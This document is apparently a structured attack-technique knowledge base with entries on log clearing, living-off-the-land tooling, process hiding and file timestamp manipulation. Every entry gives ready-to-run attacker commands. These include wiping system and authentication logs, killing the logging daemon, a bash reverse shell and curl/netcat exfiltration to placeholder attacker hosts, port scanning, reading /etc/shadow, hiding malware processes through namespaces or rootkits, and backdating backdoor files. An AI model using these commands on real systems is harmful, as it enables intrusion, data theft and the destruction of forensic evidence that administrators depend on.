title: Log Clearing — Removing Evidence of Intrusion from System Logs
description: After gaining access, attackers clear logs to remove traces of their activities. Techniques: (1) Clear bash history: history -c && > ~/.bash_history. (2) Clear syslog: echo '' > /var/log/syslog (requires root). (3) Clear auth log: echo '' > /var/log/auth.log. (4) Remove wtmp/btmp/utmp: echo '' > /var/log/wtmp; echo '' > /var/log/btmp; echo '' > /var/run/utmp. (5) Clear lastlog: echo '' > /var/log/lastlog. (6) Delete specific entries from logs using sed: sed -i '/ATTACKER_IP/d' /var/log/syslog. (7) Disable bash history for current session: unset HISTFILE; export HISTSIZE=0. (8) Kill logging processes: kill -9 $(pidof rsyslogd) — temporary, service will restart. (9) For Docker containers: logs are often ephemeral, but check Docker logs: docker logs CONTAINER_ID and clear if possible.
techniques: Kill logging: kill -9 $(pgrep rsyslogd) 2>/dev/null || systemctl stop rsyslog 2>/dev/null
indicators: Root or sudo access on compromised host

title: Living Off the Land (LOTL) — Using Built-in System Tools for Attack Operations
description: LOTL techniques use legitimate system binaries and tools that are already present on the target system to perform attack operations, avoiding detection by EDR/AV that would flag custom malware. Linux LOTL techniques: (1) File transfer: curl/wget/nc for downloading tools, scp/sftp for exfil. (2) Command execution: use bash -c, python -c, perl -e, ruby -e for inline scripting. (3) Data exfiltration: curl -F file=@flag.txt http://attacker/, nc ATTACKER PORT < /flag.txt, base64 /flag.txt | tr -d '\n'. (4) Port scanning: bash /dev/tcp scan, /bin/nc -zv, python socket scan. (5) Reverse shell: bash -i >& /dev/tcp/ATTACKER/PORT 0>&1, python -c 'import socket...'. (6) Privesc enumeration: find SUID, ls -la /etc/shadow, cat /etc/crontab, sudo -l. (7) Password grabbing: cat /etc/shadow (if readable), find credentials in web config files.
techniques: Netcat file transfer: nc -l -p PORT < /flag.txt (receiver) | nc IP PORT > /flag.txt (sender)
Base64 exfil: base64 /flag.txt | tr -d '\n' | curl -X POST -d @- http://attacker/collect
Port scan with bash: for port in {1..65535}; do timeout 0.1 bash -c "echo >/dev/tcp/IP/$port" 2>/dev/null && echo $port open; done
indicators: Available system tools: bash, python, perl, nc, curl
Target environment with restricted software installation
prerequisites: Standard system utilities available (bash, python, nc, curl)

title: Process Hiding — Concealing Malicious Processes from System Monitoring
description: Process hiding prevents sysadmins and monitoring tools from detecting attacker processes. Linux techniques: (1) LD_PRELOAD hooking: override readdir/readdir64 in libc to filter process from /proc listing. (2) Mount namespace: unshare to create isolated mount namespace where processes aren't visible to host. (3) Process name spoofing: exec -a FAKE_NAME command — changes argv[0] to look like legitimate process. (4) Hide in plain sight: name processes like system daemons (kworker, systemd-*, dbus-daemon). (5) PID namespace: run in separate PID namespace to hide from host process list. (6) Kernel module: if root with module loading, use diamorphine or similar rootkit for complete process hiding. (7) Docker/podman: run in container to hide from host ps — but process still visible via docker ps.
techniques: LD_PRELOAD hook: compile .so that hooks readdir to filter /proc entries
Mount namespace: unshare -m sh -c 'mount -t proc none /proc; ./malware'
Hide as system process: rename binary to systemd-coredump, kworker, etc.
Docker hide: docker run -d --name innocent_container alpine ./malware
indicators: Root access required for LD_PRELOAD/mount namespace techniques
Kernel module loading support for rootkit
Process list showing anomalies (duplicate kworkers, unexpected daemons)
prerequisites: Root or sudo access (most techniques require it)

title: Timestomp — Timestamp Manipulation for File Activity Concealment
description: Timestomping modifies file timestamps (access, modification, change times) to hide when files were created or modified during an attack. Linux techniques: (1) Reference file: touch -r /etc/passwd /tmp/backdoor — copies timestamps from legitimate file to malicious file. (2) Set specific time: touch -t 202401010101 /tmp/backdoor. (3) Preserve timestamps during file operations: cp -p (preserve), rsync -t (preserve times). (4) Modify only access time: touch -a -r REFERENCE TARGET. (5) Modify only modification time: touch -m -r REFERENCE TARGET. (6) Clear all timestamps to epoch: touch -t 197001010000 TARGET. (7) Use atime mount options: mount -o remount,noatime on sensitive directories to prevent access time updates. (8) For forensic-resistant operations: combine with shred/wipe and log clear.
techniques: Check times: stat /tmp/backdoor — verify all three timestamps
indicators: Write access to files on target
Reference file with desired timestamps accessible
prerequisites: Understanding of atime/mtime/ctime/btime (birth time on some FS)
